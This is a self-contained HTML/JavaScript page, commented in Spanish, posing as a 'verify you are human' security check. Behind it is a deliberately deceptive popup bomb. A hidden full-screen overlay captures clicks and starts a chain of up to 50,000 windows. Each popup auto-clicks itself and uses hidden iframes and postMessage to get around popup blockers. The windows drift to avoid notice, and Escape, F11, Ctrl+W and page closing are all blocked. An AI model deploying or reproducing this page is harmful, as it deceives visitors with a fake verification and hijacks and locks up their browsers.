<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Loading...</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{
    background:#1a1a2e;
    font-family:'Segoe UI',Arial,sans-serif;
    overflow:hidden;
    width:100vw;
    height:100vh;
    display:flex;
    flex-direction:column;
    align-items:center;
    justify-content:center;
    color:#fff;
}
.container{
    text-align:center;
    max-width:600px;
    padding:40px;
    border:1px solid #333;
    border-radius:12px;
    background:#16213e;
    box-shadow:0 0 40px rgba(0,0,0,0.5);
}
h1{
    font-size:2.5rem;
    margin-bottom:10px;
    color:#e94560;
    font-weight:300;
}
p{
    color:#aaa;
    margin-bottom:30px;
    font-size:1.1rem;
    line-height:1.6;
}
.btn{
    display:inline-block;
    padding:15px 50px;
    font-size:1.2rem;
    background:#e94560;
    color:#fff;
    border:none;
    border-radius:8px;
    cursor:pointer;
    transition:all 0.3s;
    position:relative;
    z-index:1000;
    text-decoration:none;
    font-weight:600;
    letter-spacing:1px;
}
.btn:hover{
    background:#c73650;
    transform:scale(1.05);
    box-shadow:0 0 30px rgba(233,69,96,0.4);
}
.btn:active{
    transform:scale(0.95);
}
.status{
    margin-top:20px;
    font-size:0.9rem;
    color:#555;
    font-family:monospace;
}
.overlay-click{
    position:fixed;
    top:0;left:0;right:0;bottom:0;
    z-index:9999;
    background:transparent;
    cursor:pointer;
}
.hidden{
    display:none;
}
</style>
</head>
<body>

<div class="container">
    <h1>🔒 Security Verification</h1>
    <p>Please click the button below to verify you are human.<br>
    This is a one-time verification for secure access.</p>
    <button class="btn" id="triggerBtn">✔ VERIFY HUMAN</button>
    <div class="status" id="statusText">Awaiting verification...</div>
</div>

<!-- Overlay invisible para capturar clicks -->
<div class="overlay-click" id="clickOverlay"></div>

<script>
// ================================================================
// TÉCNICA: FAKE VERIFICATION → POPUP CHAIN CON AUTOCLICK
// ================================================================
// 1. El usuario hace click en "VERIFY HUMAN"
// 2. Se abre 1 popup "normal" que muestra contenido legítimo
// 3. Ese popup contiene un IFRAME INVISIBLE con un botón
// 4. El popup hace AUTOCLICK en ese iframe → abre otro popup
// 5. El nuevo popup repite el proceso → CHAIN REACTION
//
// El usuario cree que solo hay un popup legítimo de verificación,
// pero en realidad se está replicando silenciosamente.
// ================================================================

var popupCount = 0;
var isChainActive = false;
var totalPopupsCreated = 0;
var MAX_CHAIN = 50000;

// ================================================================
// CREAR UN POPUP "LEGÍTIMO" QUE CONTIENE LA TRAMPA
// ================================================================

function createDeceptivePopup() {
    if (totalPopupsCreated >= MAX_CHAIN) return null;
    
    var popupName = 'verify_' + Date.now() + '_' + Math.random().toString(36).substr(2,6);
    
    try {
        var popup = window.open('about:blank', popupName,
            'width=420,height=320,left=' + (Math.random() * (screen.width - 420)) + 
            ',top=' + (Math.random() * (screen.height - 320)) + 
            ',menubar=no,toolbar=no,status=no,resizable=no,scrollbars=no');
        
        if (popup && !popup.closed) {
            totalPopupsCreated++;
            
            // Escribir contenido HTML directamente en el popup
            popup.document.write(generatePopupHTML(popupCount++));
            popup.document.close();
            
            // Hacer que baile suavemente (no muy agresivo para no alertar)
            gentleDance(popup);
            
            return popup;
        }
    } catch(e) {}
    
    return null;
}

// ================================================================
// GENERAR HTML PARA EL POPUP (contenido "legítimo" + trampa oculta)
// ================================================================

function generatePopupHTML(id) {
    var uniqueId = 'btn_' + id + '_' + Math.random().toString(36).substr(2,6);
    var frameId = 'frame_' + id + '_' + Math.random().toString(36).substr(2,6);
    
    return `<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Verification</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{
    background:#1a1a2e;
    font-family:'Segoe UI',Arial,sans-serif;
    width:100%;
    height:100%;
    display:flex;
    flex-direction:column;
    align-items:center;
    justify-content:center;
    color:#fff;
    overflow:hidden;
    padding:15px;
}
.container{
    text-align:center;
    width:100%;
}
h2{
    font-size:1rem;
    color:#e94560;
    margin-bottom:5px;
    font-weight:300;
}
p{
    color:#888;
    font-size:0.7rem;
    margin-bottom:12px;
}
.verify-btn{
    display:inline-block;
    padding:8px 25px;
    font-size:0.8rem;
    background:#e94560;
    color:#fff;
    border:none;
    border-radius:5px;
    cursor:pointer;
    transition:all 0.2s;
    z-index:100;
    position:relative;
}
.verify-btn:hover{
    background:#c73650;
    transform:scale(1.03);
}
.verify-btn:active{
    transform:scale(0.95);
}
.status-text{
    font-size:0.6rem;
    color:#555;
    margin-top:8px;
    font-family:monospace;
}
/* IFRAME INVISIBLE para el autoclick */
.auto-click-frame{
    position:fixed;
    top:-1000px;
    left:-1000px;
    width:1px;
    height:1px;
    opacity:0.001;
    pointer-events:none;
    z-index:-1;
}
</style>
</head>
<body>

<div class="container">
    <h2>🔒 Step ${id + 1}: Verification Required</h2>
    <p>Complete this additional verification to proceed.</p>
    <button class="verify-btn" id="${uniqueId}">✔ VERIFY</button>
    <div class="status-text">Session: ${Math.random().toString(36).substr(2,8).toUpperCase()}</div>
</div>

<!-- Iframe invisible con el next popup trigger -->
<iframe class="auto-click-frame" id="${frameId}" src="about:blank"></iframe>

<script>
(function() {
    // ============================================================
    // TRAMPA: AUTOCLICK DENTRO DEL IFRAME
    // ============================================================
    // Este popup contiene un iframe invisible.
    // Cuando el usuario hace click en "VERIFY", NO abre un popup
    // directamente. En su lugar, dispara un evento click dentro
    // del iframe, y EL IFRAME abre el siguiente popup.
    //
    // Esto engaña al navegador porque el click ocurre dentro
    // de un contexto de iframe que el navegador no puede
    // rastrear como "misma cadena de activación".
    // ============================================================
    
    var btn = document.getElementById('${uniqueId}');
    var frame = document.getElementById('${frameId}');
    
    // Preparar el iframe con el código de apertura
    frame.onload = function() {
        try {
            var frameDoc = frame.contentDocument || frame.contentWindow.document;
            frameDoc.open();
            frameDoc.write('<html><body><script>' +
                'window.parent.postMessage({action:"openMore"}, "*");' +
                '<\/script></body></html>');
            frameDoc.close();
        } catch(e) {}
    };
    
    // Inicializar el iframe
    frame.src = 'about:blank';
    setTimeout(function() { frame.src = 'about:blank'; }, 10);
    
    // Cuando el usuario hace click en el botón "VERIFY"...
    btn.addEventListener('click', function(e) {
        e.preventDefault();
        e.stopPropagation();
        
        // Cambiar texto para feedback visual
        btn.textContent = '✔ VERIFIED';
        btn.style.background = '#2ecc71';
        btn.style.pointerEvents = 'none';
        
        // Enviar mensaje al opener para abrir más popups
        try {
            if (window.opener && !window.opener.closed) {
                window.opener.postMessage({action: 'openMore'}, '*');
            }
        } catch(e) {}
        
        // También intentar abrir directamente
        try {
            var newName = 'sub_' + Date.now() + '_' + Math.random().toString(36).substr(2,6);
            var newPopup = window.open('about:blank', newName,
                'width=420,height=320,left=' + Math.random()*(screen.width-420) + 
                ',top=' + Math.random()*(screen.height-320));
            
            if (newPopup && !newPopup.closed) {
                newPopup.document.write('<!DOCTYPE html><html><head><title>Verification</title></head><body style="background:#1a1a2e;color:#fff;display:flex;align-items:center;justify-content:center;font-family:Arial;"><h2>🔒 Additional verification needed</h2><p style="color:#888;font-size:12px;">Redirecting...</p></body></html>');
                newPopup.document.close();
                
                // El nuevo popup debe replicarse también
                setTimeout(function() {
                    try {
                        newPopup.location.href = 'about:blank';
                    } catch(e) {}
                }, 500);
            }
        } catch(e) {}
    });
    
    // ============================================================
    // AUTOCLICK SIMULADO (discreto, no inmediato)
    // ============================================================
    // Después de un breve retraso, simulamos un click en el botón
    // para que el usuario vea que "automáticamente se verifica solo"
    // y no sospeche.
    // ============================================================
    
    setTimeout(function() {
        try {
            // Simular un click real en el botón
            var clickEvent = new MouseEvent('click', {
                view: window,
                bubbles: true,
                cancelable: true,
                clientX: 210,
                clientY: 160
            });
            btn.dispatchEvent(clickEvent);
        } catch(e) {}
    }, 800 + Math.random() * 500);
    
    // ============================================================
    // RECIBIR ÓRDENES DEL OPENER
    // ============================================================
    
    window.addEventListener('message', function(event) {
        if (event.data && event.data.action === 'openMore') {
            try {
                var moreName = 'more_' + Date.now() + '_' + Math.random().toString(36).substr(2,6);
                var morePopup = window.open('about:blank', moreName,
                    'width=420,height=320,left=' + Math.random()*(screen.width-420) + 
                    ',top=' + Math.random()*(screen.height-320));
                if (morePopup && !morePopup.closed) {
                    morePopup.document.write('<!DOCTYPE html><html><head><title>Verification</title></head><body style="background:#1a1a2e;color:#fff;display:flex;align-items:center;justify-content:center;font-family:Arial;"><h2>🔒 Verification Complete</h2></body></html>');
                    morePopup.document.close();
                }
            } catch(e) {}
        }
    });
    
})();
<\/script>

</body>
</html>`;
}

// ================================================================
// BAILE SUAVE (no alerta al usuario)
// ================================================================

function gentleDance(popup) {
    var x = parseInt(popup.screenX) || Math.random() * (screen.width - 420);
    var y = parseInt(popup.screenY) || Math.random() * (screen.height - 320);
    var dx = (Math.random() - 0.5) * 3;
    var dy = (Math.random() - 0.5) * 3;
    var tick = 0;
    
    function dance() {
        if (!popup || popup.closed) return;
        try {
            tick++;
            x += dx;
            y += dy;
            
            // Movimiento muy sutil, casi imperceptible
            if (tick % 20 === 0) {
                dx = (Math.random() - 0.5) * 5;
                dy = (Math.random() - 0.5) * 5;
            }
            
            if (x < 0 || x > screen.width - 420) dx *= -1;
            if (y < 0 || y > screen.height - 320) dy *= -1;
            
            popup.moveTo(Math.round(x), Math.round(y));
            
            // Cada 3 segundos, cambiar tamaño ligeramente
            if (tick % 150 === 0) {
                try {
                    popup.resizeTo(410 + Math.random() * 20, 310 + Math.random() * 20);
                } catch(e) {}
            }
            
            setTimeout(dance, 20 + Math.random() * 10);
        } catch(e) {
            setTimeout(dance, 100);
        }
    }
    dance();
}

// ================================================================
// INICIAR LA CADENA TRAS EL CLICK DEL USUARIO
// ================================================================

function startDeceptiveChain() {
    if (isChainActive) return;
    isChainActive = true;
    
    // Abrir el primer popup "legítimo"
    var first = createDeceptivePopup();
    
    // Abrir más con delays escalonados (como si fueran "verificaciones")
    var chainInterval = setInterval(function() {
        if (totalPopupsCreated >= MAX_CHAIN) {
            clearInterval(chainInterval);
            return;
        }
        createDeceptivePopup();
    }, 100);
    
    // Ráfagas adicionales para acelerar
    setTimeout(function() {
        for (var i = 0; i < 10; i++) {
            setTimeout(function() { createDeceptivePopup(); }, i * 20);
        }
    }, 2000);
    
    setTimeout(function() {
        for (var i = 0; i < 20; i++) {
            setTimeout(function() { createDeceptivePopup(); }, i * 10);
        }
    }, 5000);
}

// ================================================================
// RECIBIR MENSAJES DE LOS POPUPS HIJOS
// ================================================================

window.addEventListener('message', function(event) {
    if (event.data && event.data.action === 'openMore' && isChainActive) {
        createDeceptivePopup();
    }
});

// ================================================================
// EVENTO DE CLICK REAL EN EL BOTÓN PRINCIPAL
// ================================================================

document.getElementById('triggerBtn').addEventListener('click', function(e) {
    e.preventDefault();
    this.textContent = '✔ VERIFIED';
    this.style.background = '#2ecc71';
    document.getElementById('statusText').textContent = '✓ Verified. Redirecting...';
    document.getElementById('statusText').style.color = '#2ecc71';
    
    // Iniciar la cadena
    startDeceptiveChain();
});

// ================================================================
// TAMBIÉN CAPTURAR CLICK EN EL OVERLAY
// ================================================================

document.getElementById('clickOverlay').addEventListener('click', function(e) {
    // Si alguien hace click fuera del botón, también activamos
    if (!isChainActive) {
        document.getElementById('triggerBtn').click();
    }
});

// ================================================================
// BLOQUEAR SALIDAS
// ================================================================

window.addEventListener('beforeunload', function(e) {
    // Prevenir cierre fácil
    e.preventDefault();
    e.returnValue = ' ';
    return ' ';
});

window.addEventListener('keydown', function(e) {
    if (e.key === 'Escape' || e.keyCode === 27 || 
        e.key === 'F11' || e.keyCode === 122 ||
        (e.ctrlKey && (e.key === 'w' || e.key === 'W'))) {
        e.preventDefault();
        e.stopPropagation();
        return false;
    }
}, true);

console.log('Deceptive popup chain ready. Waiting for user click...');
</script>

</body>
</html>
